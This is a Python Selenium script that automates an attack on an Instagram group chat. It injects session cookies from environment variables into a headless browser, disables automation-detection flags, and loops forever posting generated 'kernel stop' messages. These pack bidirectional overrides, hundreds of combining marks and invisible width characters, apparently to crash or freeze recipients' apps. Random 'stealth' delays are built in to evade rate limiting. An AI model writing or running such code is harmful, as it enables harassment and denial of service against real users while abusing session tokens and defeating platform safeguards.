# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (10-AGENT STEALTH)
# 📅 STATUS: 10-MACHINES | 3-IDS | BYPASS-V2

import os, time, random, sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def get_kernel_stop_payload(target_name):
    u_id = random.randint(1000, 9999)
    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}\n"
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(250))
    z_tower = "̸" * 700 # Balanced density for stability
    width_bomb = "\u2800\u00A0" * 120
    lines = [header, shifter]
    for i in range(25):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{i}{z_tower}")
    return "\n".join(lines)[:9990]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    # Desktop User-Agent to bypass headless detection
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def main():
    machine_id = int(os.environ.get("MACHINE_ID", "1"))
    raw_cookies = os.environ.get("SESSION_ID", "").split(",")
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()

    # Mapping 10 machines to 3 IDs
    cookie_index = (machine_id - 1) % len(raw_cookies)
    current_cookie = raw_cookies[cookie_index].strip()
    
    driver = None
    try:
        print(f"📡 [Machine {machine_id}] Starting Bypass...")
        driver = get_driver()
        driver.get("https://www.instagram.com/")
        driver.add_cookie({'name': 'sessionid', 'value': current_cookie, 'path': '/', 'domain': '.instagram.com'})
        driver.refresh()
        time.sleep(15) # Longer wait for page hydration

        # Check for checkpoint
        if "checkpoint" in driver.current_url or "login" in driver.current_url:
            print(f"🚨 [Machine {machine_id}] Account #{cookie_index} BLOCKED/EXPIRED.")
            sys.exit(1)

        driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
        
        # Stability Wait for the Textbox
        wait = WebDriverWait(driver, 50)
        box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        print(f"✅ [Machine {machine_id}] Target Locked. Beginning Strike.")

        while True:
            # 🔥 THE DOUBLE-TAP
            for _ in range(2):
                payload = get_kernel_stop_payload(target_name)
                driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
                box.send_keys(Keys.ENTER)
                time.sleep(2)

            # ⏳ STEALTH GAP (15-22s)
            time.sleep(random.uniform(15, 22))
            
            # Anti-Freeze Refresh
            if random.random() < 0.1:
                driver.refresh()
                time.sleep(12)

    except Exception as e:
        print(f"⚠️ [Machine {machine_id}] Error: {str(e)[:50]}")
        if driver: driver.quit()
        sys.exit(1)

if __name__ == "__main__":
    main()
